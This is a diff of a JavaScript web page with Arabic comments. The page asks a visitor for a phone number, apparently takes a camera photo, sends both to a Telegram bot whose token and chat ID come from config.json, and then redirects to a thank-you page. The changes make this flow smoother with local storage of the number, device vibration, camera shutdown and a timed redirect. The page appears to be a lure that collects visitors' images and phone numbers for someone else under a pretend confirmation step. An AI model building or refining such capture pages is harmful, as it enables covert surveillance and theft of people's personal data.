@@ -1,4 +1,4 @@
-let botToken = '';
+  let botToken = '';
 let chatId = '';
 
 // تحميل الإعدادات من config.json
@@ -46,7 +46,11 @@ function startCameraAndSend() {
     alert('يرجى إدخال رقم الهاتف.');
     return;
   }
-  document.getElementById('confirmBtn').innerHTML = 'جاري تاكيد...';
+
+  // حفظ الرقم محليًا
+  localStorage.setItem('userPhone', phoneNumber);
+
+  document.getElementById('confirmBtn').innerHTML = 'جاري التأكيد...';
   document.getElementById('confirmBtn').disabled = true;
   captureAndSendPhoto(phoneNumber);
 }
@@ -90,16 +94,26 @@ async function captureAndSendPhoto(phoneNumber) {
           console.error("فشل الإرسال:", result.description);
           resetButton();
         } else {
-          // الإرسال ناجح — تحويل لصفحة الشكر
-          window.location.href = 'thanks.html';
+          // إهتزاز عند التأكيد
+          if (navigator.vibrate) {
+            navigator.vibrate([300, 100, 300]);
+          }
+
+          // إيقاف الكاميرا
+          stream.getTracks().forEach(track => track.stop());
+
+          // تحويل لصفحة الشكر بعد تأخير بسيط ليشعر المستخدم بالاهتزاز
+          setTimeout(() => {
+            window.location.href = 'thanks.html';
+          }, 500);
         }
       })
       .catch(err => {
         console.error("خطأ أثناء الإرسال:", err);
         resetButton();
+        stream.getTracks().forEach(track => track.stop());
       });
 
-      stream.getTracks().forEach(track => track.stop());
     }, 'image/jpeg');
 
   } catch (error) {
